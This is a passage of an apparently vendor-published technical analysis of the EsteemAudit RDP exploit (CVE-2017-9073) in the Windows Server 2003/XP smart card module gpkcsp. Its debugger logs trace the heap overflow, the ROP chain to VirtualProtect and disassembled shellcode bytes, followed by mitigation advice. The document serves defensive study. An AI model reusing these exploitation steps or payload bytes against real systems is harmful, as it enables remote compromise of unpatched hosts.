<p>7c963465 ntdll!LdrpRunInitializeRoutines+0x00000367</p>
<p>7c964311 ntdll!LdrpLoadDll+0x000003cd</p>
<p>7c964065 ntdll!LdrLoadDll+0x00000198</p>
<p>7c801bf3 kernel32!LoadLibraryExW+0x000001b2</p>
<p>7c801dbd kernel32!LoadLibraryExA+0x0000001f</p>
<p>7c801df3 kernel32!LoadLibraryA+0x000000b5</p>
<p>77f42fef ADVAPI32!CryptAcquireContextA+0x0000045c</p>
<p>77f50a5f ADVAPI32!CryptAcquireContextW+0x000000a4</p>
<p>0103fd78 winlogon!CSCLogonInit::CryptCtx+0x00000075</p>
<p>0104086c winlogon!CSCLogonInit::RelinquishCryptCtx+0x00000010</p>
<p>010408c1 winlogon!ScHelperGetCertFromLogonInfo+0x00000022</p>
<p>0103a8f5 winlogon!s_RPC_ScHelperGetCertFromLogonInfo+0x0000003f</p>
<p>77c50193 RPCRT4!Invoke+0x00000030</p>
<p>77cb33e1 RPCRT4!NdrStubCall2+0x00000299</p>
<p>77cb35c4 RPCRT4!NdrServerCall2+0x00000019</p>
<p>77c4ff7a RPCRT4!DispatchToStubInCNoAvrf+0x00000038</p>
<p>77c7e732 RPCRT4!DispatchToStubInCAvrf+0x00000014</p>
<p>77c5042d RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x0000011f</p>
<p>77c50353 RPCRT4!RPC_INTERFACE::DispatchToStub+0x000000a3</p>
<p>77c511dc RPCRT4!LRPC_SCALL::DealWithRequestMessage+0x0000042c</p>
<p>77c512f0 RPCRT4!LRPC_ADDRESS::DealWithLRPCRequest+0x00000127</p>
<p>77c58678 RPCRT4!LRPC_ADDRESS::ReceiveLotsaCalls+0x00000430</p>
<p>77c58792 RPCRT4!RecvLotsaCallsWrapper+0x0000000d</p>
<p>77c5872d RPCRT4!BaseCachedThreadRoutine+0x0000009d</p>
<p>77c4b110 RPCRT4!ThreadStartRoutine+0x0000001b</p>
<p>7c824829 kernel32!BaseThreadStart+0x00000034</p>
<p>&nbsp;</td>
</tr>
</tbody>
</table>
<p>Figure 29 below graphically shows the data structure of gpkcsp!ProvCont.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_32.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31456" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_32.png" alt="esteemaudit_32" width="865" height="425" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_32.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_32-300x147.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_32-768x377.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_32-370x182.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 30 Graphical Depiction of the gpkcsp!ProvCont data structure.</em></p>
<p>After calling DoSCardTransmit to deal with buffer overflow packet and store the data in 0x080190d8, <strong>MyCPAcquireContext initialize the KeyData memory (0x80) and copies the data at 0x080190dd with the size in the data sent by client (0xb2-7) to the KeyData memory.</strong></p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_33.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31432" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_33.png" alt="esteemaudit_33" width="865" height="351" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_33.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_33-300x122.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_33-768x312.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_33-370x150.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 31 MyCPAcquireContext Initializes data structure and copies data, causing the overflow</em></p>
<p>Figure 32 below shows how memory is overwritten causing the heap overflow.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_34.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31408" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_34.png" alt="esteemaudit_34" width="865" height="435" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_34.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_34-300x151.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_34-768x386.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_34-370x186.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 32 Graphical Depiction of the Heap Overflow</em></p>
<p>The debug log shows where KeyObject object overflows.</p>
<table style="height: 309px;" width="584">
<tbody>
<tr>
<td width="415">0:003&gt; dc 02cdcb58+a0+b8-20</p>
<p>02cdcc90  b7314210 544f2b0f 34059cf0 ead224e5  .B1..+OT&#8230;4.$..</p>
<p>02cdcca0  22ef2496 b2dcb268 9c36556f 159e7181  .$.&#8221;h&#8230;oU6..q..</p>
<p>02cdccb0  <strong>080190dc</strong> 00009000 70e2a252 b67b7cc7  &#8230;&#8230;..R..p.|{.</p>
<p>02cdccc0  62937b2c afe0bbbd 93606931 dcdba152  ,{.b&#8230;.1i`.R&#8230;</p>
<p>02cdccd0  00cd84d1 00000000 00000000 00000000  &#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>02cdcce0  00000000 00000000 00000000 00000000  &#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>02cdccf0  00000000 00000000 00000000 00000000  &#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>02cdcd00  00000000 00000000 00000000 00000000  &#8230;&#8230;&#8230;&#8230;&#8230;.</td>
</tr>
</tbody>
</table>
<p>After KeyObject overflows, we can see how gpkcsp!MyCPAcquireContext deals with the next packets and how the EIP was controlled.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_35.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31384" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_35.png" alt="esteemaudit_35" width="865" height="197" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_35.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_35-300x68.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_35-768x175.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_35-370x84.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p>Figure 33 gpkcsp!MyCPAcquireContext handles the subsequent packets</p>
<p>We note that the unsymbolized function sub_8009094 calls DoSCardTransmit and copies expbuffer to 0x080x90d8, which is an always fix address to store any data sent by client without ASLR (Address Space Layout Randomization) on Windows Server 2003.</p>
<table style="height: 1099px;" width="646">
<tbody>
<tr>
<td width="415">0:003&gt; dc 080190d8 L1c0/4</p>
<p>080190d8  d26ccf61 08011e7a 0801118e 08005e85  a.l.z&#8230;&#8230;..^..</p>
<p>080190e8  0800bedd 11111111 9d273fbe e636c0ea  &#8230;&#8230;&#8230;?&#8217;&#8230;6.</p>
<p>080190f8  00000000 b02838fd 08011fef 08019078  &#8230;..8(&#8230;..x&#8230;</p>
<p>08019108  3005123c 22222222 00000000 f7a1d915  &lt;..0&#8243;&#8221;&#8221;&#8221;&#8230;&#8230;..</p>
<p>08019118  00004000 080128cc 0000008f 7ffe0300  .@&#8230;(&#8230;&#8230;&#8230;.</p>
<p>08019128  08015074 08019148 08019118 ffffffff  tP..H&#8230;&#8230;&#8230;..</p>
<p>08019138  08019130 08019118 00000040 08019130  0&#8230;&#8230;.@&#8230;0&#8230;</p>
<p>08019148  8b6404b0 06002d00 c4890000 00e8c689  ..d..-&#8230;&#8230;&#8230;.</p>
<p>08019158  90000000 d5858b5d 89000000 858b0446  &#8230;.]&#8230;&#8230;.F&#8230;</p>
<p>08019168  000000d9 310c4689 104689c0 8b144689  &#8230;..F.1..F..F..</p>
<p>08019178  0000dd85 8b008b00 0000bc80 18468900  &#8230;&#8230;&#8230;&#8230;..F.</p>
<p>08019188  00e1858b 008b0000 8b1c4689 0000e585  &#8230;&#8230;&#8230;F&#8230;&#8230;</p>
<p>08019198  89008b00 468b2046 2846890c 4689c031  &#8230;.F .F..F(1..F</p>
<p>080191a8  00b5e82c c0850000 468b6675 0846892c  ,&#8230;&#8230;.uf.F,.F.</p>
<p>080191b8  2b0c468b 89501046 468b50e0 10460308  .F.+F.P..P.F..F.</p>
<p>080191c8  50c03150 ff1476ff 76ff0476 1876ff20  P1.P.v..v..v .v.</p>
<p>080191d8  591c56ff 8b144689 c8011046 8b104689  .V.Y.F..F&#8230;.F..</p>
<p>080191e8  46890846 10468b24 00d9853b c07c0000  F..F$.F.;&#8230;..|.</p>
<p>080191f8  4689c031 244e8b10 0189c889 0471ff51  1..F..N$&#8230;.Q.q.</p>
<p>08019208  c083c889 d0ff5014 03ebc031 5048c031  &#8230;..P..1&#8230;1.HP</p>
<p>08019218  852c468b 8b0e74c0 58e81058 85000000  .F,..t..X..X&#8230;.</p>
<p>08019228  ff0274db c3e431d3 080192d8 00006346  .t&#8230;1&#8230;&#8230;Fc..</p>
<p>08019238  08176dd8 0800119c 080011cc 000012b8  .m&#8230;&#8230;&#8230;&#8230;..</p>
<p>08019248  24548d00 c22ecd04 18c20018 0057b800  ..T$&#8230;&#8230;&#8230;.W.</p>
<p>08019258  548d0000 2ecd0424 6a0010c2 30006840  &#8230;T$&#8230;&#8230;j@h.0</p>
<p>08019268  468d0000 c0315028 2c468d50 48c03150  &#8230;F(P1.P.F,P1.H</p>
<p>08019278  ffc6e850 68c3ffff 00008000 5028468d  P&#8230;&#8230;h&#8230;..F(P</p>
<p>08019288  502c468d 5048c031 ffffc0e8 6578c3ff  .F,P1.HP&#8230;&#8230;xe</p>
<p>&nbsp;</td>
</tr>
</tbody>
</table>
<p>After the exploit buffer is ready, gpkcsp!MyCPAcquireContext processes the ReleaseProvider path.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_36.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31360" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_36.png" alt="esteemaudit_36" width="387" height="177" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_36.png 387w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_36-300x137.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_36-370x169.png 370w" sizes="(max-width: 387px) 100vw, 387px" /></a></p>
<p><em>Figure 34 gpkcsp!MyCPAcquireContext processes the ReleaseProvider path</em></p>
<p>This will trigger the C++ class vtable call KeyObject-&gt;release in the CryptDestroyKey function.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_37.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31336" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_37.png" alt="esteemaudit_37" width="865" height="294" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_37.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_37-300x102.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_37-768x261.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_37-370x126.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 35 Object is released in the CryptDestroyKey function</em></p>
<p>The log below show the process from controlling EIP to shellcode execution. The exploit uses the SharedUserData technique to call KiFastSystemCall to execute VirtualProtect and make the memory 0x080180d8 writable and executable, and to execute the shellcode at address 0x08019148. At this point the exploit has completed the first stage.</p>
<table style="height: 4347px;" width="724">
<tbody>
<tr>
<td width="415">&nbsp;</p>
<p>0:011&gt; g 08007c2b</p>
<p>eax=080190dc ebx=77f3f5b0 ecx=02cdaff8 edx=00000000 esi=000000b8 edi=00000000</p>
<p>eip=08007c2b esp=02dfe40c ebp=02dfe420 iopl=0         nv up ei pl nz na po nc</p>
<p>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</p>
<p>gpkcsp!ReleaseProvider+0xef:</p>
<p>08007c2b ffd3            call    ebx {ADVAPI32!CryptDestroyKey (77f3f5b0)}</p>
<p>&nbsp;</p>
<p>0:011&gt;</p>
<p>eax=00000001 ebx=00000001 ecx=77f50c75 edx=00000000 esi=080190dc edi=08019078</p>
<p>eip=77f3f615 esp=02dfe3c0 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc</p>
<p>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</p>
<p>ADVAPI32!CryptDestroyKey+0x6e:</p>
<p>77f3f615 ff5608          call    dword ptr [esi+8]    ds:0023:080190e4=08005e85</p>
<p>0:011&gt; t</p>
<p>eax=00000001 ebx=00000001 ecx=77f50c75 edx=00000000 esi=080190dc edi=08019078</p>
<p>eip=08005e85 esp=02dfe3bc ebp=02dfe404 iopl=0         nv up ei pl nz na po nc</p>
<p>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</p>
<p>gpkcsp!GetAppWindow+0x1c:</p>
<p>08005e85 8bc6            mov     eax,esi</p>
<p>0:011&gt;</p>
<p>eax=080190dc ebx=00000001 ecx=77f50c75 edx=00000000 esi=080190dc edi=08019078</p>
<p>eip=08005e87 esp=02dfe3bc ebp=02dfe404 iopl=0         nv up ei pl nz na po nc</p>
<p>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</p>
<p>gpkcsp!GetAppWindow+0x1e:</p>
<p>08005e87 5e              pop     esi</p>
<p>0:011&gt;</p>
<p>eax=080190dc ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078</p>
<p>eip=08005e88 esp=02dfe3c0 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc</p>
<p>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</p>
<p>gpkcsp!GetAppWindow+0x1f:</p>
<p>08005e88 c3              ret</p>
<p>0:011&gt; t</p>
<p>eax=080190dc ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078</p>
<p>eip=0800bedd esp=02dfe3c4 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc</p>
<p>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</p>
<p>gpkcsp!funcCheck+0x129:</p>
<p>0800bedd 94              xchg    eax,esp</p>
<p>0:011&gt; t</p>
<p>eax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078</p>
<p>eip=0800bede esp=080190dc ebp=02dfe404 iopl=0         nv up ei pl nz na po nc</p>
<p>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</p>
<p>gpkcsp!funcCheck+0x12a:</p>
<p>0800bede c3              ret</p>
<p>0:011&gt; t</p>
<p>eax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078</p>
<p>eip=08011e7a esp=080190e0 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc</p>
<p>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</p>
<p>gpkcsp!MyCPSignHash+0x3ac:</p>
<p>08011e7a c21c00          ret     1Ch</p>
<p>0:011&gt; t</p>
<p>eax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078</p>
<p>eip=0801118e esp=08019100 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc</p>
<p>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</p>
<p>gpkcsp!MyCPImportKey+0xac3:</p>
<p>0801118e c21800          ret     18h</p>
<p>0:011&gt; t</p>
<p>eax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078</p>
<p>eip=08011fef esp=0801911c ebp=02dfe404 iopl=0         nv up ei pl nz na po nc</p>
<p>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</p>
<p>gpkcsp!__report_gsfailure+0xdf:</p>
<p>08011fef c3              ret</p>
<p>0:011&gt; t</p>
<p>eax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078</p>
<p>eip=080128cc esp=08019120 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc</p>
<p>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</p>
<p>gpkcsp!CC_Exit+0x4f:</p>
<p>080128cc 58              pop     eax</p>
<p>0:011&gt; t</p>
<p>eax=0000008f ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078</p>
<p>eip=080128cd esp=08019124 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc</p>
<p>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</p>
<p>gpkcsp!CC_Exit+0x50:</p>
<p>080128cd 5b              pop     ebx</p>
<p>0:011&gt; t</p>
<p>eax=0000008f ebx=7ffe0300 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078</p>
<p>eip=080128ce esp=08019128 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc</p>
<p>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</p>
<p>gpkcsp!CC_Exit+0x51:</p>
<p>080128ce c3              ret</p>
<p>0:011&gt; t</p>
<p>eax=0000008f ebx=7ffe0300 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078</p>
<p>eip=08015074 esp=0801912c ebp=02dfe404 iopl=0         nv up ei pl nz na po nc</p>
<p>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</p>
<p>gpkcsp!CC_Exit+0x27f7:</p>
<p>08015074 ff23            jmp     dword ptr [ebx]      ds:0023:7ffe0300={ntdll!KiFastSystemCall (7c9585e8)}</p>
<p>&nbsp;</p>
<p>Shellcode start:</p>
<p>No prior disassembly possible</p>
<p>08019148 b004            mov     al,4</p>
<p>0801914a 648b00          mov     eax,dword ptr fs:[eax]</p>
<p>0801914d 2d00060000      sub     eax,600h</p>
<p>08019152 89c4            mov     esp,eax</p>
<p>08019154 89c6            mov     esi,eax</p>
<p>08019156 e800000000      call    gpkcsp!IsProgButtonClick+0x8f (0801915b)</p>
<p>0801915b 90              nop</p>
<p>0801915c 5d              pop     ebp</p>
<p>0801915d 8b85d5000000    mov     eax,dword ptr [ebp+0D5h]</p>
<p>08019163 894604          mov     dword ptr [esi+4],eax</p>
<p>08019166 8b85d9000000    mov     eax,dword ptr [ebp+0D9h]</p>
<p>0801916c 89460c          mov     dword ptr [esi+0Ch],eax</p>
<p>0801916f 31c0            xor     eax,eax</p>
<p>08019171 894610          mov     dword ptr [esi+10h],eax</p>
<p>08019174 894614          mov     dword ptr [esi+14h],eax</p>
<p>08019177 8b85dd000000    mov     eax,dword ptr [ebp+0DDh]</p>
<p>0801917d 8b00            mov     eax,dword ptr [eax]</p>
<p>0801917f 8b80bc000000    mov     eax,dword ptr [eax+0BCh]</p>
<p>08019185 894618          mov     dword ptr [esi+18h],eax</p>
<p>08019188 8b85e1000000    mov     eax,dword ptr [ebp+0E1h]</p>
<p>0801918e 8b00            mov     eax,dword ptr [eax]</p>
<p>08019190 89461c          mov     dword ptr [esi+1Ch],eax</p>
<p>08019193 8b85e5000000    mov     eax,dword ptr [ebp+0E5h]</p>
<p>08019199 8b00            mov     eax,dword ptr [eax]</p>
<p>0801919b 894620          mov     dword ptr [esi+20h],eax</p>
<p>0801919e 8b460c          mov     eax,dword ptr [esi+0Ch]</p>
<p>080191a1 894628          mov     dword ptr [esi+28h],eax</p>
<p>080191a4 31c0            xor     eax,eax</p>
<p>080191a6 89462c          mov     dword ptr [esi+2Ch],eax</p>
<p>080191a9 e8b5000000      call    gpkcsp!IsProgButtonClick+0x197 (08019263)</p>
<p>…</p>
<p>&nbsp;</p>
<p>0:011&gt; !address 08019148</p>
<p>Failed to map Heaps (error 80004005)</p>
<p>Usage:                  Image</p>
<p>Allocation Base:        08000000</p>
<p>Base Address:           08019000</p>
<p>End Address:            0801e000</p>
<p>Region Size:            00005000</p>
<p>Type:                   01000000    MEM_IMAGE</p>
<p>State:                  00001000    MEM_COMMIT</p>
<p>Protect:                00000040   PAGE_EXECUTE_READWRITE</p>
<p>More info:              lmv m gpkcsp</p>
<p>More info:              !lmi gpkcsp</p>
<p>More info:              ln 0x8019148</td>
</tr>
</tbody>
</table>
<h3>Detection and Mitigation</h3>
<p>As CVE-2017-9073 only exists on Windows Server 2003 and Windows XP, both of which are no longer supported by Microsoft, users should first consider upgrading to a newer version of Windows as no official patch is available. However, as this vulnerability exists in the smart card module gpkcsp, there are potential work-arounds.</p>
<ul>
<li><a href="https://technet.microsoft.com/en-us/library/cc725887(v=ws.10).aspx">Disabling the smart card module</a> through Group Policy or in the registry.
<ul>
<li>Do this in the registry: Set/Add key fEnableSmartCard in the path HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\ to 0 with the type of REG_DWORD.</li>
</ul>
</li>
<li><a href="https://www.paloaltonetworks.com/products/secure-the-endpoint/traps">Traps</a> prevents exploitation of this vulnerability on Windows XP and Server 2003 hosts.</li>
<li>Threat Prevention Signature 32533 released in Content Update 692 detects the exploit in the NGFW.</li>
<li>Wherever possible, disable or restrict access to RDP from external sources</li>
</ul>
<h3>Conclusion</h3>
<p>RDP is a very useful but very complex component of Windows. Based on our analysis of the EsteemAudit exploit, we find that the vulnerability itself is not obscure, but it took quite a bit of effort to write a successful exploit. Interestingly, gpkcsp choose a global variable to store the data sent by the client, it supplies a capacity of controlling the arbitrary data in already-known address in the remote server without ASLR. This is a powerful feature for exploit authors to take advantage of. In any case, EsteemAudit is a reliable and powerful RDP exploit tool for Windows XP and Windows 2003. Users should take steps to ensure their Windows XP and Windows Server 2003 are protected through one of the mitigation steps listed above. A network vulnerability like this one can be used in a “worm-able” fashion, similar to the WanaCrypt0r attacks which had global impact earlier this month.</p>
<hr />
<div class="quizz-container" data-width="100%" data-iframe-title="QUIZ: What Kind of Ignite Guardian Are You?" data-height="auto" data-quiz="385597"></div>
<p><script src="//dcc4iyjchzom0.cloudfront.net/widget/loader.js" async></script></p>
<p class="p2"><span class="s2"><a href="http://go.paloaltonetworks.com/ignite2017"><b>Register for Ignite ’17 Security Conference </b></a><br />
<i>Vancouver, BC June 12–15, 2017</i></span></p>
<p class="p2"><span class="s2">Ignite ’17 Security Conference is a live, four-day conference designed for today’s security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit the <a href="http://www.paloaltonetworksignite.com/"><span class="s3">Ignite website</span></a> for more information on tracks, workshops and marquee sessions.</span></p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
